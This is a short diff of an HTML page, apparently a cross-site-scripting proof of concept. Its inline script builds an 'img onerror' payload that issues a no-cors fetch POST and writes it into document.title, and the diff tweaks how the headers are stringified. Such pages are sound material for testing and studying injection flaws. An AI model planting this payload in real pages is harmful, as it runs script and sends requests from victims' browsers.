@@ -8,7 +8,6 @@
 <body>
   <p>"DATA"</p>
     <script>
-
         // Function to create a script tag with a POST request
         function createScriptWithPostRequest() {
             var method = "POST";
@@ -21,8 +20,7 @@
                 "mode": "no-cors"
             };
 
-            var requestString = stringifyRequest(method, url, body, headers);
-            var fetchString = 'fetch(' + url + ', {method: ' + method + ', body: ' + body + ', headers: ' + headers + '})';
+            var fetchString = 'fetch(' + url + ', {method: ' + method + ', body: ' + body + ', headers: ' + JSON.stringify(headers) + '})';
             var XSS = '<img src="/" onerror="' + fetchString + '"/>';
             document.title = XSS;
 
